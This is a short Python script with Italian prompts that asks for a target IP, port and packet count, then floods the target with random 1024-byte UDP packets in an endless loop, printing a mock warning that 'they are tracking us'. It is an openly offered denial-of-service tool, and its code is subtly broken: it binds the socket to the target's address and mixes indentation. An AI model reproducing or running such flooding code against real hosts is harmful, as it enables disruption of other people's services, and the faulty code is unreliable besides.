import socket
import random

ip = input("IP da attaccare: ")
porta = int(input("Porta da attaccare: "))

pacchetto = int(input("Pacchetti da inviare: "))

while 1:
	nsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	nsocket.bind((ip, porta))
	dati = random.randbytes(1024)
	indirizzo = (str(ip), int(porta))
        
	for x in range (pacchetto):
		nsocket.sendto (dati, indirizzo)
		print ("Ci stanno tracciando, stacca, STACCA!!")
	nsocket.close()

